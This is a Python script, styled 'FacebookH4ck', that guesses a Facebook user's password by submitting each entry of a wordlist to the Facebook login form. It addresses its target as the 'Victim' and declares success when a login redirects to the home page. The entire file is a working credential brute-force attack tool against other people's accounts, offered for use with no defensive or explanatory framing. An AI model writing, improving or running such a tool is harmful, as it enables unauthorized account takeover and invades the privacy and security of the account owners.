import sys
import random
import mechanize
import cookielib

print(("""
Welcome FacebookH4ck!
""").encode('utf-8'))

useragents = [('User-agent',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

print("Tip")
print("You Can Copy Victim's Id From Facebook Profile")
print("That Was The Tip")
email = str(raw_input("Enter Victim's ID or Url not Email: \t"))
print("Warning!")
print("Make Sure The Wordlist In The Folder")
pwd_file = str(raw_input("Enter Wordlist Name: \t"))

try:
    list = open(pwd_file, 'r')
    passwords = list.readlines()
except IOError:
    print('Wrong Wordlist: ')
    sys.exit(0)


def start(password):
    try:
        br.addheaders = [('User-agent', random.choice(useragents))]
        br.open('https://www.facebook.com/login.php?login_attempt=1')
        br.select_form(nr=0)

        br.form['email'] = email
        br.form['pass'] = password
        br.submit()

        log = br.geturl()
        print("[Incorrect Password :]:\t" + str(password))
        if log == 'https://www.facebook.com/':
            print("\nYAAAY Password Found The Password Is  :\t " + password)
            print("Thank's For Using FacebookH4ck")
            sys.exit(0)
        else:
            return
    except KeyboardInterrupt:
        sys.exit(1)


br = mechanize.Browser()
cj = cookielib.LWPCookieJar()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_handle_redirect(True)
br.set_cookiejar(cj)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

for i in range(len(passwords)):
    passwords[i] = passwords[i].strip()
    passwords[i] = passwords[i].replace('\n', '')

for password in passwords:
    start(password)
